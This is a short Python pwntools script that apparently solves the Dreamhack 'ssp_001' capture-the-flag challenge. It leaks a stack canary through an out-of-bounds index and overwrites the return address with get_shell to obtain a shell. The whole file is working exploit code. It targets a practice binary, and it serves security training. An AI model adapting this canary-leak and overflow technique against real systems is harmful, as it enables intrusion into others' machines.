from pwn import *

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))


#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 20549)
e = ELF("./ssp_001")

get_shell = e.symbols['get_shell']


# Canary Leak
canary = b""

i = 131
while i >= 128:
  p.sendlineafter("> ", 'P')
  p.sendlineafter("Element index : ", str(i))
  p.recvuntil("is : ")
  canary += p.recvn(2)
  i = i - 1

canary = int(canary, 16)
slog("canary", canary)


# BOF
payload = b'A' * 64
payload += p32(canary)
payload += b'A' * 12
payload += p32(get_shell)

p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", payload)

p.interactive()